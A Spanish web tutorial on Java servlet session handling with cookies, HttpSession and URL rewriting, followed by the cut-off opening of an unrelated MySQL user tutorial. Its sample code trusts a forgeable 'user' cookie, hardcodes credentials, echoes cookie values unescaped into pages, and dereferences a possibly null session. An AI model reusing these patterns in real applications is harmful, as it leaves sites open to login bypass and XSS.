# Gestión de sesiones en Java: HttpServlet, cookies, reescritura de URL.

![Gestión de sesiones en Java: HttpServlet, cookies, reescritura de URL.](https://www.digitalocean.com/api/static-content/v1/images?src=%2F_next%2Fstatic%2Fmedia%2Fintro-to-cloud.d49bc5f7.jpeg\&width=1920)

**La gestión de sesiones en aplicaciones web Java** Servlet es un tema muy interesante. **Las sesiones en Java** Servlet se gestionan de diversas maneras, como mediante cookies, la API **HttpSession** , la reescritura de URL, etc

[![Gestión de sesiones en Java, sesiones en Java Servlet usando cookies, HttpServlet, reescritura de URL](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Session-Management-in-Java-HttpSession-Session-in-Java.jpg)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Session-Management-in-Java-HttpSession-Session-in-Java.jpg)

Este es el tercer artículo de la serie de tutoriales sobre aplicaciones web en Java; también te recomendamos consultar los dos artículos anteriores.

1. [Tutorial de aplicación web Java](https://www.digitalocean.com/community/tutorials/java-web-application-tutorial-for-beginners)
2. [Tutorial de Java Servlet](https://www.digitalocean.com/community/tutorials/servlet-jsp-tutorial)

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#session-management-in-java">Gestión de sesiones en Java</a></summary>

Este artículo tiene como objetivo explicar la gestión de sesiones en servlets utilizando diferentes técnicas y con programas de ejemplo.

1. [¿Qué es una sesión?](https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#servlet-session)
2. [Gestión de sesiones en Java - Cookies](https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#servlet-cookies)
3. [Sesión en Java Servlet - HttpSession](https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#servlet-httpsession)
4. [Gestión de sesiones en Java Servlet - Reescritura de URL](https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#servlet-url-rewriting)
5.  #### [¿Qué es una sesión?](https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#what-is-a-session)

    El protocolo HTTP y los servidores web son sin estado, lo que significa que para un servidor web cada solicitud es una nueva solicitud que debe procesar y no puede identificar si proviene de un cliente que ya ha enviado solicitudes anteriormente. Sin embargo, en ocasiones, en las aplicaciones web, necesitamos saber quién es el cliente y procesar la solicitud en consecuencia. Por ejemplo, una aplicación de carrito de compras debe saber quién envía la solicitud para agregar un artículo y en qué carrito debe agregarse, o quién envía la solicitud de pago para poder cobrar el monto al cliente correcto. **La sesión** es un estado de conversión entre el cliente y el servidor y puede constar de múltiples solicitudes y respuestas entre ambos. Dado que tanto HTTP como los servidores web son sin estado, la única forma de mantener una sesión es cuando se pasa información única sobre la sesión (ID de sesión) entre el servidor y el cliente en cada solicitud y respuesta. Existen varias formas de proporcionar un identificador único en la solicitud y la respuesta.

    1. **Autenticación de usuario** : Este es el método más común en el que el usuario proporciona sus credenciales de autenticación en la página de inicio de sesión. Posteriormente, la información de autenticación se transmite entre el servidor y el cliente para mantener la sesión. Sin embargo, este método no es muy eficaz, ya que no funciona si el mismo usuario inicia sesión desde diferentes navegadores.
    2. **Campo oculto HTML** : Podemos crear un campo oculto único en el HTML y, cuando el usuario comience a navegar, podemos establecer su valor de forma exclusiva para ese usuario y mantener un registro de la sesión. Este método no se puede usar con enlaces, ya que requiere que el formulario se envíe cada vez que se realice una solicitud del cliente al servidor con el campo oculto. Además, no es seguro, ya que podemos obtener el valor del campo oculto del código fuente HTML y usarlo para interceptar la sesión.
    3. **Reescritura de URL** : Podemos agregar un parámetro de identificador de sesión a cada solicitud y respuesta para mantener el seguimiento de la sesión. Esto es muy tedioso porque debemos controlar este parámetro en cada respuesta y asegurarnos de que no entre en conflicto con otros parámetros.
    4. **Cookies** : Las cookies son pequeños fragmentos de información que el servidor web envía en la cabecera de la respuesta y que se almacenan en las cookies del navegador. Cuando el cliente realiza una solicitud posterior, se añade la cookie a la cabecera de la solicitud, lo que nos permite mantener el seguimiento de la sesión. Podemos mantener una sesión mediante cookies, pero si el cliente las desactiva, esta función dejará de funcionar.
    5.  **API de administración de sesiones** : la API de administración de sesiones se basa en los métodos anteriores para el seguimiento de sesiones. Algunas de las principales desventajas de todos los métodos anteriores son:

        * La mayoría de las veces no solo queremos hacer un seguimiento de la sesión, sino que también necesitamos almacenar datos que podamos usar en solicitudes futuras. Implementar esto requerirá mucho esfuerzo.
        * Ninguno de los métodos mencionados es completo por sí solo, y no todos funcionarán en un escenario particular. Por lo tanto, necesitamos una solución que pueda utilizar estos métodos de seguimiento de sesiones para proporcionar gestión de sesiones en todos los casos.

        Por eso necesitamos **una API de gestión de sesiones** , y la tecnología J2EE Servlet incluye una API de gestión de sesiones que podemos utilizar.
6.

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#session-management-in-java-cookies">Gestión de sesiones en Java - Cookies</a></summary>

Las cookies se utilizan mucho en las aplicaciones web para personalizar la respuesta según la elección del usuario o para mantener el seguimiento de la sesión. Antes de pasar a la API de administración de sesiones de Servlet, me gustaría mostrar cómo podemos realizar un seguimiento de la sesión con cookies a través de una pequeña aplicación web. Crearemos una aplicación web dinámica llamada **ServletCookieExample** con una estructura de proyecto como la que se muestra en la siguiente imagen.[![Sesión en Java mediante cookies](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-Cookie-Example-Project.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-Cookie-Example-Project.png)El descriptor de despliegue web.xml de la aplicación web es:

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="https://www.w3.org/2001/XMLSchema-instance" xmlns="https://java.sun.com/xml/ns/javaee" xsi:schemaLocation="https://java.sun.com/xml/ns/javaee https://java.sun.com/xml/ns/javaee/web-app_3_0.xsd" id="WebApp_ID" version="3.0">
  <display-name>ServletCookieExample</display-name>
  <welcome-file-list>
    <welcome-file>login.html</welcome-file>
  </welcome-file-list>
</web-app>
```

La página de bienvenida de nuestra aplicación es login.html, donde obtendremos los detalles de autenticación del usuario.

```
<!DOCTYPE html>
<html>
<head>
<meta charset="US-ASCII">
<title>Login Page</title>
</head>
<body>

<form action="LoginServlet" method="post">

Username: <input type="text" name="user">
<br>
Password: <input type="password" name="pwd">
<br>
<input type="submit" value="Login">
</form>
</body>
</html>
```

Aquí está el LoginServlet que se encarga de la solicitud de inicio de sesión.

```
package com.journaldev.servlet.session;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet implementation class LoginServlet
 */
@WebServlet("/LoginServlet")
public class LoginServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
	private final String userID = "Pankaj";
	private final String password = "journaldev";

	protected void doPost(HttpServletRequest request,
			HttpServletResponse response) throws ServletException, IOException {

		// get request parameters for userID and password
		String user = request.getParameter("user");
		String pwd = request.getParameter("pwd");
		
		if(userID.equals(user) && password.equals(pwd)){
			Cookie loginCookie = new Cookie("user",user);
			//setting cookie to expiry in 30 mins
			loginCookie.setMaxAge(30*60);
			response.addCookie(loginCookie);
			response.sendRedirect("LoginSuccess.jsp");
		}else{
			RequestDispatcher rd = getServletContext().getRequestDispatcher("/login.html");
			PrintWriter out= response.getWriter();
			out.println("<font color=red>Either user name or password is wrong.</font>");
			rd.include(request, response);
		}

	}

}
```

Observe la cookie que se asigna a la respuesta y que luego se reenvía a LoginSuccess.jsp; esta cookie se utilizará allí para el seguimiento de la sesión. Tenga en cuenta también que el tiempo de espera de la cookie está configurado en 30 minutos. Idealmente, debería existir una lógica compleja para establecer el valor de la cookie para el seguimiento de la sesión, de modo que no entre en conflicto con ninguna otra solicitud.

```
<%@ page language="java" contentType="text/html; charset=US-ASCII"
    pageEncoding="US-ASCII"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "https://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=US-ASCII">
<title>Login Success Page</title>
</head>
<body>
<%
String userName = null;
Cookie[] cookies = request.getCookies();
if(cookies !=null){
for(Cookie cookie : cookies){
	if(cookie.getName().equals("user")) userName = cookie.getValue();
}
}
if(userName == null) response.sendRedirect("login.html");
%>
<h3>Hi <%=userName %>, Login successful.</h3>
<br>
<form action="LogoutServlet" method="post">
<input type="submit" value="Logout" >
</form>
</body>
</html>
```

Tenga en cuenta que si intentamos acceder directamente al JSP, nos redirigirá a la página de inicio de sesión. Al hacer clic en el botón Cerrar sesión, debemos asegurarnos de que la cookie se elimine del navegador del cliente.

```
package com.journaldev.servlet.session;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/**
 * Servlet implementation class LogoutServlet
 */
@WebServlet("/LogoutServlet")
public class LogoutServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    	response.setContentType("text/html");
    	Cookie loginCookie = null;
    	Cookie[] cookies = request.getCookies();
    	if(cookies != null){
    	for(Cookie cookie : cookies){
    		if(cookie.getName().equals("user")){
    			loginCookie = cookie;
    			break;
    		}
    	}
    	}
    	if(loginCookie != null){
    		loginCookie.setMaxAge(0);
        	response.addCookie(loginCookie);
    	}
    	response.sendRedirect("login.html");
    }

}
```

No existe un método para eliminar la cookie, pero podemos establecer la antigüedad máxima en 0 para que se elimine inmediatamente del navegador del cliente. Al ejecutar la aplicación anterior, obtenemos una respuesta similar a la de las imágenes que se muestran a continuación.[![Gestión de sesiones en Java mediante cookies](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/ServletCookie-login.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/ServletCookie-login.png)[![Gestión de sesiones de servlets Java mediante cookies](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/ServletCookie-login-success-450x182.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/ServletCookie-login-success.png)

*

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#session-in-java-servlet-httpsession">Sesión en Java Servlet - HttpSession</a></summary>

La API de Servlet proporciona gestión de sesiones a través de `HttpSession`una interfaz. Podemos obtener la sesión del objeto HttpServletRequest mediante los siguientes métodos. HttpSession nos permite establecer objetos como atributos que se pueden recuperar en solicitudes futuras.

1. **HttpSession getSession()** - Este método siempre devuelve un objeto HttpSession. Devuelve el objeto de sesión asociado a la solicitud; si la solicitud no tiene una sesión asociada, crea una nueva sesión y la devuelve.
2. **HttpSession getSession(boolean flag)** : este método devuelve un objeto HttpSession si la solicitud tiene una sesión; de lo contrario, devuelve null.

Algunos de los métodos importantes de HttpSession son:

1. **String getId()** - Devuelve una cadena que contiene el identificador único asignado a esta sesión.
2. **Object getAttribute(String name)** : devuelve el objeto vinculado con el nombre especificado en esta sesión, o null si no hay ningún objeto vinculado con ese nombre. Otros métodos para trabajar con atributos de sesión son `getAttributeNames()`, `removeAttribute(String name)`y `setAttribute(String name, Object value)`.
3. **long getCreationTime()** - Devuelve la hora en que se creó esta sesión, medida en milisegundos desde la medianoche del 1 de enero de 1970 GMT. Podemos obtener la hora del último acceso con `getLastAccessedTime()`el método.
4. setMaxInactiveInterval(int interval) - Especifica el tiempo, en segundos, entre las solicitudes del cliente antes de que el contenedor de servlets invalide esta sesión. Podemos obtener el valor del tiempo de espera de la sesión desde `getMaxInactiveInterval()`el método.
5. **ServletContext getServletContext()** - Devuelve el objeto ServletContext para la aplicación.
6. **boolean isNew()** - Devuelve verdadero si el cliente aún no conoce la sesión o si el cliente decide no unirse a la sesión.
7. **void invalidate()** - Invalida esta sesión y luego desvincula cualquier objeto vinculado a ella.

#### [Comprender la cookie JSESSIONID](https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#understanding-jsessionid-cookie)

Cuando usamos el método getSession() de HttpServletRequest y crea una nueva solicitud, crea un nuevo objeto HttpSession y también agrega una cookie al objeto de respuesta con el nombre JSESSIONID y el valor como ID de sesión. Esta cookie se usa para identificar el objeto HttpSession en solicitudes posteriores del cliente. Si las cookies están deshabilitadas en el lado del cliente y estamos usando la reescritura de URL, este método usa el valor jsessionid de la URL de la solicitud para encontrar la sesión correspondiente. La cookie JSESSIONID se usa para el seguimiento de la sesión, por lo que no debemos usarla para los propósitos de nuestra aplicación para evitar cualquier problema relacionado con la sesión. Veamos un ejemplo de administración de sesión usando el objeto HttpSession. Crearemos un proyecto web dinámico en Eclipse con el contexto de servlet como ServletHttpSessionExample. La estructura del proyecto se verá como en la siguiente imagen.[![Gestión de sesiones de servlets HttpSession](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-HttpSession-Example-Project.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-HttpSession-Example-Project.png)login.html es igual que el ejemplo anterior y está definido como página de bienvenida para la aplicación en web.xml El servlet LoginServlet creará la sesión y establecerá atributos que podemos usar en otros recursos o en solicitudes futuras.

```
package com.journaldev.servlet.session;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/**
 * Servlet implementation class LoginServlet
 */
@WebServlet("/LoginServlet")
public class LoginServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
	private final String userID = "admin";
	private final String password = "password";

	protected void doPost(HttpServletRequest request,
			HttpServletResponse response) throws ServletException, IOException {

		// get request parameters for userID and password
		String user = request.getParameter("user");
		String pwd = request.getParameter("pwd");
		
		if(userID.equals(user) && password.equals(pwd)){
			HttpSession session = request.getSession();
			session.setAttribute("user", "Pankaj");
			//setting session to expiry in 30 mins
			session.setMaxInactiveInterval(30*60);
			Cookie userName = new Cookie("user", user);
			userName.setMaxAge(30*60);
			response.addCookie(userName);
			response.sendRedirect("LoginSuccess.jsp");
		}else{
			RequestDispatcher rd = getServletContext().getRequestDispatcher("/login.html");
			PrintWriter out= response.getWriter();
			out.println("<font color=red>Either user name or password is wrong.</font>");
			rd.include(request, response);
		}

	}

}
```

Nuestro código LoginSuccess.jsp se muestra a continuación.

```
<%@ page language="java" contentType="text/html; charset=US-ASCII"
    pageEncoding="US-ASCII"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "https://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=US-ASCII">
<title>Login Success Page</title>
</head>
<body>
<%
//allow access only if session exists
String user = null;
if(session.getAttribute("user") == null){
	response.sendRedirect("login.html");
}else user = (String) session.getAttribute("user");
String userName = null;
String sessionID = null;
Cookie[] cookies = request.getCookies();
if(cookies !=null){
for(Cookie cookie : cookies){
	if(cookie.getName().equals("user")) userName = cookie.getValue();
	if(cookie.getName().equals("JSESSIONID")) sessionID = cookie.getValue();
}
}
%>
<h3>Hi <%=userName %>, Login successful. Your Session ID=<%=sessionID %></h3>
<br>
User=<%=user %>
<br>
<a href="CheckoutPage.jsp">Checkout Page</a>
<form action="LogoutServlet" method="post">
<input type="submit" value="Logout" >
</form>
</body>
</html>
```

Cuando se utiliza un recurso JSP, el contenedor crea automáticamente una sesión para él, por lo que no podemos comprobar si la sesión es nula para asegurarnos de que el usuario ha accedido a través de la página de inicio de sesión. Por ello, utilizamos el atributo de sesión para validar la solicitud. CheckoutPage.jsp es otra página cuyo código se muestra a continuación.

```
<%@ page language="java" contentType="text/html; charset=US-ASCII"
    pageEncoding="US-ASCII"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "https://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=US-ASCII">
<title>Login Success Page</title>
</head>
<body>
<%
//allow access only if session exists
if(session.getAttribute("user") == null){
	response.sendRedirect("login.html");
}
String userName = null;
String sessionID = null;
Cookie[] cookies = request.getCookies();
if(cookies !=null){
for(Cookie cookie : cookies){
	if(cookie.getName().equals("user")) userName = cookie.getValue();
}
}
%>
<h3>Hi <%=userName %>, do the checkout.</h3>
<br>
<form action="LogoutServlet" method="post">
<input type="submit" value="Logout" >
</form>
</body>
</html>
```

Nuestro código LogoutServlet se muestra a continuación.

```
package com.journaldev.servlet.session;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/**
 * Servlet implementation class LogoutServlet
 */
@WebServlet("/LogoutServlet")
public class LogoutServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    	response.setContentType("text/html");
    	Cookie[] cookies = request.getCookies();
    	if(cookies != null){
    	for(Cookie cookie : cookies){
    		if(cookie.getName().equals("JSESSIONID")){
    			System.out.println("JSESSIONID="+cookie.getValue());
    			break;
    		}
    	}
    	}
    	//invalidate the session if exists
    	HttpSession session = request.getSession(false);
    	System.out.println("User="+session.getAttribute("user"));
    	if(session != null){
    		session.invalidate();
    	}
    	response.sendRedirect("login.html");
    }

}
```

Observe que estoy imprimiendo el valor de la cookie JSESSIONID en los registros; puede consultar el registro del servidor, donde se imprimirá el mismo valor que Session Id en LoginSuccess.jsp. Las imágenes a continuación muestran la ejecución de nuestra aplicación web.[![Sesión en una aplicación web Java Servlet](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/HttpSession-Login-Page-450x167.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/HttpSession-Login-Page.png)[![Sesión HttpSession en una aplicación web Java Servlet](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/HttpSession-LoginSuccess-Page-450x133.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/HttpSession-LoginSuccess-Page.png)[![Eliminar sesión en una aplicación web Java Servlet](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/HttpSession-Checkout-Page-450x164.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/HttpSession-Checkout-Page.png)

*   #### [Gestión de sesiones en Java Servlet - Reescritura de URL](https://www.digitalocean.com/community/tutorials/java-session-management-servlet-httpsession-url-rewriting#session-management-in-java-servlet-url-rewriting)

    Como vimos en la sección anterior, podemos gestionar una sesión con HttpSession, pero si deshabilitamos las cookies en el navegador, no funcionará porque el servidor no recibirá la cookie JSESSIONID del cliente. La API de Servlet proporciona soporte para la reescritura de URL que podemos usar para gestionar la sesión en este caso. Lo mejor es que, desde el punto de vista de la codificación, es muy fácil de usar y solo requiere un paso: codificar la URL. Otra ventaja de la codificación de URL de Servlet es que es un método de reserva y solo se activa si las cookies del navegador están deshabilitadas. Podemos codificar la URL con `encodeURL()`el método HttpServletResponse y, si tenemos que redirigir la solicitud a otro recurso y queremos proporcionar información de sesión, podemos usar `encodeRedirectURL()`el método. Crearemos un proyecto similar al anterior, excepto que usaremos métodos de reescritura de URL para asegurarnos de que la gestión de la sesión funcione correctamente incluso si las cookies están deshabilitadas en el navegador. La estructura del proyecto ServletSessionURLRewriting en Eclipse se ve como en la siguiente imagen.[![Sesión en Java Servlet URL Rewriting](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-Session-URL-Rewriting-Project.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-Session-URL-Rewriting-Project.png)

    ```
    package com.journaldev.servlet.session;

    import java.io.IOException;
    import java.io.PrintWriter;

    import javax.servlet.RequestDispatcher;
    import javax.servlet.ServletException;
    import javax.servlet.annotation.WebServlet;
    import javax.servlet.http.Cookie;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import javax.servlet.http.HttpSession;

    /**
     * Servlet implementation class LoginServlet
     */
    @WebServlet("/LoginServlet")
    public class LoginServlet extends HttpServlet {
    	private static final long serialVersionUID = 1L;
    	private final String userID = "admin";
    	private final String password = "password";

    	protected void doPost(HttpServletRequest request,
    			HttpServletResponse response) throws ServletException, IOException {

    		// get request parameters for userID and password
    		String user = request.getParameter("user");
    		String pwd = request.getParameter("pwd");
    		
    		if(userID.equals(user) && password.equals(pwd)){
    			HttpSession session = request.getSession();
    			session.setAttribute("user", "Pankaj");
    			//setting session to expiry in 30 mins
    			session.setMaxInactiveInterval(30*60);
    			Cookie userName = new Cookie("user", user);
    			response.addCookie(userName);
    			//Get the encoded URL string
    			String encodedURL = response.encodeRedirectURL("LoginSuccess.jsp");
    			response.sendRedirect(encodedURL);
    		}else{
    			RequestDispatcher rd = getServletContext().getRequestDispatcher("/login.html");
    			PrintWriter out= response.getWriter();
    			out.println("<font color=red>Either user name or password is wrong.</font>");
    			rd.include(request, response);
    		}

    	}

    }
    ```

    ```
    <%@ page language="java" contentType="text/html; charset=US-ASCII"
        pageEncoding="US-ASCII"%>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "https://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=US-ASCII">
    <title>Login Success Page</title>
    </head>
    <body>
    <%
    //allow access only if session exists
    String user = null;
    if(session.getAttribute("user") == null){
    	response.sendRedirect("login.html");
    }else user = (String) session.getAttribute("user");
    String userName = null;
    String sessionID = null;
    Cookie[] cookies = request.getCookies();
    if(cookies !=null){
    for(Cookie cookie : cookies){
    	if(cookie.getName().equals("user")) userName = cookie.getValue();
    	if(cookie.getName().equals("JSESSIONID")) sessionID = cookie.getValue();
    }
    }else{
    	sessionID = session.getId();
    }
    %>
    <h3>Hi <%=userName %>, Login successful. Your Session ID=<%=sessionID %></h3>
    <br>
    User=<%=user %>
    <br>
    <!-- need to encode all the URLs where we want session information to be passed -->
    <a href="<%=response.encodeURL("CheckoutPage.jsp") %>">Checkout Page</a>
    <form action="<%=response.encodeURL("LogoutServlet") %>" method="post">
    <input type="submit" value="Logout" >
    </form>
    </body>
    </html>
    ```

    ```
    <%@ page language="java" contentType="text/html; charset=US-ASCII"
        pageEncoding="US-ASCII"%>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "https://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=US-ASCII">
    <title>Login Success Page</title>
    </head>
    <body>
    <%
    String userName = null;
    //allow access only if session exists
    if(session.getAttribute("user") == null){
    	response.sendRedirect("login.html");
    }else userName = (String) session.getAttribute("user");
    String sessionID = null;
    Cookie[] cookies = request.getCookies();
    if(cookies !=null){
    for(Cookie cookie : cookies){
    	if(cookie.getName().equals("user")) userName = cookie.getValue();
    }
    }
    %>
    <h3>Hi <%=userName %>, do the checkout.</h3>
    <br>
    <form action="<%=response.encodeURL("LogoutServlet") %>" method="post">
    <input type="submit" value="Logout" >
    </form>
    </body>
    </html>
    ```

    ```
    package com.journaldev.servlet.session;

    import java.io.IOException;

    import javax.servlet.ServletException;
    import javax.servlet.annotation.WebServlet;
    import javax.servlet.http.Cookie;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import javax.servlet.http.HttpSession;

    /**
     * Servlet implementation class LogoutServlet
     */
    @WebServlet("/LogoutServlet")
    public class LogoutServlet extends HttpServlet {
    	private static final long serialVersionUID = 1L;
           
        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        	response.setContentType("text/html");
        	Cookie[] cookies = request.getCookies();
        	if(cookies != null){
        	for(Cookie cookie : cookies){
        		if(cookie.getName().equals("JSESSIONID")){
        			System.out.println("JSESSIONID="+cookie.getValue());
        		}
        		cookie.setMaxAge(0);
        		response.addCookie(cookie);
        	}
        	}
        	//invalidate the session if exists
        	HttpSession session = request.getSession(false);
        	System.out.println("User="+session.getAttribute("user"));
        	if(session != null){
        		session.invalidate();
        	}
        	//no encoding because we have invalidated the session
        	response.sendRedirect("login.html");
        }

    }
    ```

    Al ejecutar este proyecto con las cookies deshabilitadas en el navegador, las imágenes a continuación muestran las páginas de respuesta. Observe el jsessionid en la URL de la barra de direcciones del navegador. Observe también que en la página LoginSuccess, el nombre de usuario es nulo porque el navegador no envía la cookie enviada en la última respuesta. Si las cookies no están deshabilitadas, no verá el jsessionid en la URL porque la API de sesión del servlet utilizará cookies en ese caso.[![Sesión en Java Reescritura de URL](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-URL-Rewriting-Login-Page.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-URL-Rewriting-Login-Page.png)[![Gestión de sesiones en Java Reescritura de URL](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-URL-Rewriting-LoginSuccess-Page-450x113.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-URL-Rewriting-LoginSuccess-Page.png)[![Sesión en Java Reescritura de URL Cerrar sesión](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-URL-Rewriting-Checkout-Page-450x106.png)](https://journaldev.nyc3.cdn.digitaloceanspaces.com/2013/08/Servlet-URL-Rewriting-Checkout-Page.png)

Eso es todo sobre la gestión de sesiones en servlets de Java. En futuros artículos, analizaremos los filtros de servlet, los listeners y las cookies. Actualización: Consulta el siguiente artículo de la serie [**sobre filtros de servlet**](https://www.digitalocean.com/community/tutorials/java-servlet-filter-example-tutorial) .

**Descargar proyectos**

* [Descargar proyecto de ejemplo de cookies de servlet](https://journaldev.nyc3.cdn.digitaloceanspaces.com/servlet/ServletCookieExample.zip)
* [Descargar proyecto de ejemplo de Servlet HttpSession](https://journaldev.nyc3.cdn.digitaloceanspaces.com/servlet/ServletHttpSessionExample.zip)
* [Descargue el proyecto de ejemplo para la reescritura de URL de sesión de servlet.](https://journaldev.nyc3.cdn.digitaloceanspaces.com/servlet/ServletSessionURLRewriting.zip)

</details>

## Cómo crear un usuario de MySQL y otorgarle privilegios (paso a paso)



<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#introduction">Introducción</a></summary>

[MySQL](https://www.digitalocean.com/community/tutorials/what-is-mysql) es un sistema de gestión de bases de datos relacionales de código abierto que se suele implementar como parte del _conjunto LAMP_ (que significa **Linux** , **Apache** , **MySQL** y **PHP** ) y, en el momento de escribir este artículo, es la [base de datos de código abierto más popular](https://www.statista.com/statistics/809750/worldwide-popularity-ranking-database-management-systems/) del mundo.

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#key-takeaways">Conclusiones clave</a></summary>

* **Cree usuarios con`CREATE USER`** : Úselo `CREATE USER 'username'@'host' IDENTIFIED BY 'password'`para agregar nuevos usuarios de la base de datos, especificando el nombre de host (como `localhost`o `%`para cualquier host) para controlar desde dónde pueden conectarse los usuarios.
* **Otorgar privilegios con`GRANT`** : Asigne permisos específicos utilizando `GRANT privilege ON database.table TO 'username'@'host'`, siguiendo el principio del mínimo privilegio al otorgar solo los permisos que cada usuario necesita.
* **Elija el complemento de autenticación adecuado** : utilice `caching_sha2_password`(MySQL 8.0 por defecto) para una autenticación segura mediante contraseña, `mysql_native_password`para compatibilidad con PHP o `auth_socket`para acceso solo local sin contraseñas.
* **Gestiona usuarios de forma segura** : Úsalo `SHOW GRANTS`para revisar permisos, `REVOKE`eliminar privilegios y `DROP USER`borrar cuentas. Revoca siempre los privilegios antes de eliminar usuarios en producción.
* **Solucionar errores comunes** : Corrija los errores de "Acceso denegado" verificando las credenciales y los privilegios, habilite las conexiones remotas configurando el host en `%`y resuelva el error 1396 (el usuario ya existe) comprobando y eliminando primero las cuentas existentes.

</details>

<details open>

<summary><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql#prerequisites">Requisitos previos</a></summary>

Para seguir esta guía, necesitarás acceso a una base de datos MySQL. Esta guía asume que la base de datos está instalada en un servidor virtual privado con Ubuntu, aunque los principios que describe son aplicables independientemente de cómo accedas a ella.

Si no tienes acceso a una base de datos MySQL y deseas configurar una tú mismo, puedes seguir una de nuestras guías sobre [cómo instalar MySQL](https://www.digitalocean.com/community/tutorial-collections/how-to-install-mysql) . De nuevo, independientemente del sistema operativo de tu servidor, los métodos para crear un nuevo usuario de MySQL y otorgarle permisos serán generalmente los mismos.

También puedes configurar una base de datos MySQL gestionada por un proveedor de servicios en la nube. Para obtener más información sobre cómo configurar una base de datos gestionada por DigitalOcean, consulta nuestra [documentación del producto](https://docs.digitalocean.com/products/databases/mysql/how-to/create/) .

Tenga en cuenta que cualquier parte de los comandos de ejemplo que necesite cambiar o personalizar se mostrará como marcadores de posición (como `username`, `host`, `password`, etc.) a lo largo de esta guía.

</details>

<details open>

